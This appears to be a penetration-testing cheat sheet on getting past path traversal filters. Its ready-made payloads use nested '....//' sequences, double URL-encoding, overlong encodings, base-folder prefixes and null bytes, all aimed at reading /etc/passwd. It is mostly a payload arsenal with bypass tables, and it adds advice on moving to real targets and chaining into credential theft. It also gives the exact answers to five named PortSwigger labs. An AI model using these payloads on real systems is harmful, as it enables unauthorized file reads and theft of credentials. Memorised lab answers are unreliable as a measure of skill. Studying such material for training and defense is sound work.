# Path traversal — Filter bypasses

Most apps "defend" path traversal with strippers/validators that are bypassable. Five families: **absolute path** (skip traversal entirely), **nested sequences** (defeat one-pass strip), **(double) URL-encoding** (defeat decode-order mismatch), **base-folder prefix** (satisfy start-validation), **null byte** (defeat extension-validation). Outcome: arbitrary file read despite the filter.

## Quick reference
```
filename=/etc/passwd                          # absolute (traversal blocked/stripped)
filename=....//....//....//etc/passwd          # nested -> reverts to ../ after strip ( ....\/ too)
filename=..%252f..%252f..%252fetc/passwd       # double URL-encode (server superfluously decodes)
filename=..%c0%af  ..%ef%bc%8f                 # non-standard/overlong encodings
filename=/var/www/images/../../../etc/passwd   # required base-folder start + traversal
filename=../../../etc/passwd%00.png            # null byte drops required .png extension
```
Decision list: traversal stripped → absolute path or nested `....//`. Decoded once → URL-encode; decoded twice → double-encode. Must start with base dir → prefix it. Must end with `.png` → `%00.png`.

## Root cause
The filter and the filesystem API disagree, or the filter is incomplete: a single non-recursive strip leaves traversal when sequences are nested; a superfluous URL-decode turns `%252f` into `/`; start/extension checks ignore embedded traversal / null bytes.

## Technique
**Absolute path:** if `../` is stripped/blocked, reference the file directly: `filename=/etc/passwd`. No traversal sequence needed.

**Nested traversal sequences:** if the app strips `../` **once, non-recursively**, nest them: `....//` → after removing the inner `../` you're left with `../`. Also `....\/`, `..../\`. Use enough to reach root.

**URL / double URL-encoding:** web servers/frameworks may strip `../` *before* the app sees it (URL path, multipart filename). Encode: `../` → `%2e%2e%2f`; if the server **superfluously URL-decodes** (decodes twice), use double-encoding `%252e%252e%252f`. Non-standard encodings (`..%c0%af`, `..%ef%bc%8f`) defeat some decoders.

**Validation of start of path:** if the input must begin with the base dir, include it then traverse out: `filename=/var/www/images/../../../etc/passwd`.

**Validation of file extension (null byte):** if the input must end `.png`, terminate the real path with a null byte: `filename=../../../etc/passwd%00.png`. The filesystem API stops at `%00`; the validator sees `.png`. (Works on older stacks where `%00` truncates C-strings.)

**Advanced / edge:** combine (encode + nest + null byte); try `....////`, mixed `/` and `\` on Windows; Burp Intruder "Fuzzing - path traversal" list.

## Payload arsenal
```
/etc/passwd
....//....//....//etc/passwd          ....\/....\/....\/etc/passwd
..%2f..%2f..%2fetc/passwd             ..%252f..%252f..%252fetc/passwd
..%c0%af..%c0%af..%c0%afetc/passwd    ..%ef%bc%8f..%ef%bc%8fetc/passwd
/var/www/images/../../../etc/passwd
../../../etc/passwd%00.png            ../../../etc/passwd%2500.png
```

## Bypasses
| Defense | Bypass |
|---|---|
| strips/blocks `../` | absolute path `/etc/passwd` |
| strips `../` once, non-recursively | nested `....//` |
| decodes URL once | encode `%2e%2e%2f` |
| decodes URL twice (superfluous) | double-encode `%252e%252e%252f` |
| must start with base dir | prefix `/var/www/images/` then `../` |
| must end with `.png` | `%00.png` null byte |

## Exploitation walkthrough (double URL-encode)
1. `filename=../../../etc/passwd` → blocked (traversal stripped).
2. `..%2f..%2f..%2fetc/passwd` → still blocked (decoded once, then stripped).
3. `..%252f..%252f..%252fetc/passwd` → server decodes `%252f`→`%2f`→`/` after the strip → reads `/etc/passwd` → solved.

## Chaining
- Read source/config → creds → [SQL-injection](../../SQL-injection/)/[Authentication](../../Authentication/)/[JWT-attacks](../../JWT-attacks/).

## Tools
- **Burp Repeater/Intruder** ("Fuzzing - path traversal" payload list).

## Labs

### Absolute path bypass [Practitioner]
URL: .../lab-absolute-path-bypass — `filename=/etc/passwd`. Insight: traversal blocked, but absolute paths aren't.

### Sequences stripped non-recursively [Practitioner]
URL: .../lab-sequences-stripped-non-recursively — `filename=....//....//....//etc/passwd`. Insight: one-pass strip leaves `../` from `....//`.

### Sequences stripped with superfluous URL-decode [Practitioner]
URL: .../lab-superfluous-url-decode — `filename=..%252f..%252f..%252fetc/passwd`. Insight: app decodes twice → `%252f`→`/` after stripping.

### Validation of start of path [Practitioner]
URL: .../lab-validate-start-of-path — `filename=/var/www/images/../../../etc/passwd`. Insight: prefix the required base dir, then traverse out.

### Validation of file extension with null byte bypass [Practitioner]
URL: .../lab-validate-file-extension-null-byte-bypass — `filename=../../../etc/passwd%00.png`. Insight: `%00` terminates the path before `.png`.

Real-target transfer: ladder absolute → nested → encode → double-encode → base-prefix → null-byte until a file reads.

## Real-world notes
- Null-byte bypass needs older runtimes (pre-PHP 5.3.4, some Java) but still appears.
- Double-encoding and nested sequences are the most broadly effective modern bypasses.
- Always try absolute paths first — many "fixes" only target `../`.

## References
- https://portswigger.net/web-security/file-path-traversal (Common obstacles)
